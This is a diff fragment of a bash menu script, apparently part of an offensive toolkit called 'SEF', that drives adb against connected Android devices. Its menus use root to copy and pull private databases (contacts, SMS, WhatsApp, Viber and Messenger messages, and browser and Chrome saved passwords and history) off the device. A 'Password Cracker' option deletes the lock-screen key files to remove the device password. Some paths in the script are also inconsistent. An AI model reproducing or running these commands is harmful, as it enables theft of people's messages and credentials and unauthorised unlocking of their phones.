+	echo -e $BWhite"6) Android Databases Decoder"
+	echo -e $BWhite"7) Android Password Cracker"
+echo
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " android
+if [ "$android" == "exit" ]
+then
+	clear
+	exit
+elif [ "$android" == 5 ]
+	then
+	clear
+	exit
+elif [ "$android" == 'quit' ] 
+then
+	clear
+	exit
+elif [ "$android" == "clear" ]
+then
+	clear
+elif [ "$android" == "reset" ]
+then
+	reset
+elif [ "$android" == "back" ]
+then
+	clear
+#-----------------------------------------------------------------------------
+## 4-1 Show Available Connected Device
+##----------------------------------------------------------------------------
+elif [ "$android" == 1 ]
+then
+echo
+	./tools/android/adb devices
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#-----------------------------------------------------------------------------
+## 4-2 Get Android Shell
+##----------------------------------------------------------------------------
+elif [ "$android" == 2 ]
+then
+echo
+	read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+	./tools/android/adb -s $se shell
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#-----------------------------------------------------------------------------
+## 4-3 Download File From Device
+##----------------------------------------------------------------------------
+elif [ "$android" == 3 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter The File Path: ")$(echo -e $BWhite"")" path
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Where You Need Install File: ")$(echo -e $BWhite"")" to
+echo	
+	./tools/android/adb -s $se pull $path $to
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#-----------------------------------------------------------------------------
+## 4-4 Get Device Serial Number
+##----------------------------------------------------------------------------
+elif [ "$android" == 4 ]
+then
+	echo
+	./tools/android/adb get-serialno
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#-----------------------------------------------------------------------------
+## 4-5 Some Automatic Command
+##----------------------------------------------------------------------------
+elif [ "$android" == 5 ]
+then
+echo
+	echo -e $BWhite"1) Reboot The Device"
+	echo -e $BWhite"2) Backup Apk In The Device"
+	echo -e $BWhite"3) Install Apk In The Device"
+	echo -e $BWhite"4) Remove Apk From Device"
+	echo -e $BWhite"5) Launch App From The Device"
+echo
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " andro
+if [ "$andro" == "exit" ]
+then
+	clear
+	exit
+elif [ "$andro" == 5 ]
+	then
+	clear
+	exit
+elif [ "$andro" == 'quit' ] 
+then
+	clear
+	exit
+elif [ "$andro" == "clear" ]
+then
+	clear
+elif [ "$andro" == "reset" ]
+then
+	reset
+elif [ "$andro" == "back" ]
+then
+	clear
+#------------------------------
+## 1 Reboot The Device
+#------------------------------
+elif [ "$andro" == 1 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+	./tools/android/adb -s $se shell -e reboot
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+
+#------------------------------
+## 2 Backup Apk In The Device
+#------------------------------
+elif [ "$andro" == 2 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Package Name: ")$(echo -e $BWhite )" package
+	./tools/android/adb -s $se backup $package
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#------------------------------
+## 3 Install Apk In The Device
+#------------------------------
+elif [ "$andro" == 3 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Apk Path To Install: ")$(echo -e $BWhite )" path
+	./tools/android/adb -s $se install $path
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+
+#-------------------------------
+## 4 Remove Apk From Device
+#-------------------------------
+elif [ "$andro" == 4 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Package Name To Remove: ")$(echo -e $BWhite )" package
+	./tools/android/adb -s $se remove $package
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+
+#---------------------------------
+## 5 Launch App From The Device
+#---------------------------------
+elif [ "$andro" == 5 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Package Name To Launch It: ")$(echo -e $BWhite )" package
+	./tools/android/adb -s $se shell -e am start $package
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+#-----------------------------------------------------------------------------
+## 4-6 Android Databases Decoder
+##----------------------------------------------------------------------------
+elif [ "$android" == 6 ]
+then
+echo 
+	echo -e $BWhite"1) Phonebook Contacts"
+	echo -e $BWhite"2) Sms Messages"
+	echo -e $BWhite"3) Android Default Browser Passwords"
+	echo -e $BWhite"4) Android Default Browser Histroy"
+	echo -e $BWhite"5) Facebook Messenger Messages"
+	echo -e $BWhite"6) WhatsApp Messages"
+	echo -e $BWhite"7) Viber Messages"
+	echo -e $BWhite"8) Google Chrome History"
+	echo -e $BWhite"9) Google Chrome Password"
+echo
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " decod
+if [ "$decod" == "exit" ]
+then
+	clear
+	exit
+elif [ "$decod" == 'quit' ] 
+then
+	clear
+	exit
+elif [ "$decod" == "clear" ]
+then
+	clear
+elif [ "$decod" == "reset" ]
+then
+	reset
+elif [ "$decod" == "back" ]
+then
+	clear
+#----------------------------------
+## 1 Phonebook Contacts
+#----------------------------------
+elif [ "$decod" == 1 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard
+./tools/android/adb -s $se pull /sdcard/contacts2.db /root/.SEF/
+./tools/android/adb -s $se shell rm /sdcard/contacts2.db
+sqlitebrowser /root/.SEF/contacts2.db
+rm /root/.SEF/contacts2.db
+
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#----------------------------------
+## 3 Sms Messages
+#----------------------------------
+elif [ "$decod" == 2 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard
+./tools/android/adb -s $se pull /sdcard/mmssms.db /root/.SEF/
+./tools/android/adb -s $se shell rm /sdcard/mmssms.db
+sqlitebrowser /root/.SEF/mmssms.db
+rm /root/.SEF/mmssms.db
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#----------------------------------
+## 4 Android Default Browser Passwords
+#----------------------------------
+elif [ "$decod" == 3 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.android.browser/databases/webview.db /sdcard
+./tools/android/adb -s $se pull /sdcard/webview.db  /root/.SEF
+./tools/android/adb -s $se shell rm /sdcard/webview.db
+sqlitebrowser  /root/.SEF/webview.db
+rm  /root/.SEF/webview.db
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#----------------------------------
+## 5 Android Default Browser Histroy
+#----------------------------------
+elif [ "$decod" == 4 ]
+then
+echo
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.android.browser/databases/browser2.db /sdcard
+./tools/android/adb -s $se pull /sdcard/browser2.db /root/.SEF
+./tools/android/adb -s $se shell rm /sdcard/browser2.db
+sqlitebrowser /root/.SEF/browser2.db
+rm /root/.SEF/browser2.db
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#----------------------------------
+## 6 Facebook Messenger Messages
+#----------------------------------
+elif [ "$decod" == 5 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.facebook.orca/databases/threads_db2 /sdcard
+./tools/android/adb -s $se pull /sdcard/threads_db2 /root/.SEF
+./tools/android/adb -s $se shell rm /sdcard/threads_db2
+sqlitebrowser /root/.SEF/threads_db2
+rm /root/.SEF/threads_db2
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#----------------------------------
+## 7 WhatsApp Messages
+#----------------------------------
+elif [ "$decod" == 6 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.whatsapp/databases/msgstore.db /sdcard
+./tools/android/adb -s $se pull /sdcard/msgstore.db /root/.SEF
+./tools/android/adb -s $se shell rm /sdcard/msgstore.db
+./tools/android/sqlite/sqlite3 /root/msgstore.db
+rm /root/.SEF/msgstore.db
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#----------------------------------
+## 8 Viber Messages
+#----------------------------------
+elif [ "$decod" == 7 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.viber.voip/databases/viber_messages /sdcard
+./tools/android/adb -s $se pull /sdcard/viber_messages /root/.SEF
+./tools/android/adb -s $se shell rm /sdcard/viber_messages
+sqlitebrowser /root/viber_messages
+rm /root/.SEF/viber_messages
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#----------------------------------
+## 9 Google Chrome History
+#----------------------------------
+elif [ "$decod" == 8 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.android.chrome/app_chrome/Default/History /sdcard
+./tools/android/adb -s $se pull /sdcard/History /root/.SEF
+./tools/android/adb -s $se shell rm /sdcard/History
+sqlitebrowser /root/History
+rm /root/.SEF/History
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#----------------------------------
+## 10 Google Chrome Password
+#----------------------------------
+elif [ "$decod" == 9 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+./tools/android/adb -s $se shell su root cp /data/data/com.android.chrome/app_chrome/Default/Login Data /sdcard
+./tools/android/adb -s $se pull /sdcard/Login Data /root
+./tools/android/adb -s $se shell rm /sdcard/Login Data
+sqlitebrowser /root/Login Data
+rm /root/.SEF/Login Data
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+#-----------------------------------------------------------------------------
+## 4-7 Android Password Cracker
+##----------------------------------------------------------------------------
+elif [ "$android" == 7 ]
+then
+echo
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The Device Serial: ")$(echo -e $BWhite )" se
+echo
+echo -e $BWhite"[$(echo -e $BYellow"ok"$(echo -e $BWhite"]")) Search for the device"
+sleep 0.5s
+echo -e $BWhite"[$(echo -e $BYellow"ok"$(echo -e $BWhite"]")) Get device information"
+sleep 0.5s
+echo -e $BWhite"[$(echo -e $BYellow"ok"$(echo -e $BWhite"]")) Get root"
+sleep 0.5s
+echo -e $BWhite"[$(echo -e $BYellow"ok"$(echo -e $BWhite"]")) Remove password from device"
+sleep 0.5s
+./tools/android/adb shell su root rm /data/system/*.key
+echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+##############################################################################		
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+done
+
+
+
+   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
